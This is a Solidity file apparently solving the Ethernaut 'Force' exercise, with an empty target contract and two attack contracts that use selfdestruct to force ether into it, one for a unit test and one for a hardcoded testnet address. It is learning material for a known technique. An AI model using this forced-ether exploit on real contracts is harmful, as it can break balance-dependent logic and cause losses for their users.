// SPDX-License-Identifier: MIT

// exercise code

pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}


// solution used by unit test
// see https://solidity-by-example.org/hacks/self-destruct/
// call attack function with ether, which self-destructs sending
// all ether to target contract address
contract ForceAttack {
   Force force;

  constructor(address _force) {
    force =  Force(_force);
  }

  function attack() public payable {
    address payable forceAddress = payable(address(force));
    selfdestruct(forceAddress);
  }
}


// solution used to deploy live to testnet
pragma solidity ^0.8.0;

// attack contract
contract ForceAttackLive {
  // todo: change this address to your vulnerable contract instance address
  // before deploying this file to testnet via remix
  address FORCE_ADDRESS = 0xccb2E793E90F7AD1779C7C3Bdfd13d5E2B7A9825;

  Force force;

  constructor() {
    force = Force(FORCE_ADDRESS);
  }

  function attack() public payable {
    address payable forceAddress = payable(address(force));
    selfdestruct(forceAddress);
  }
}
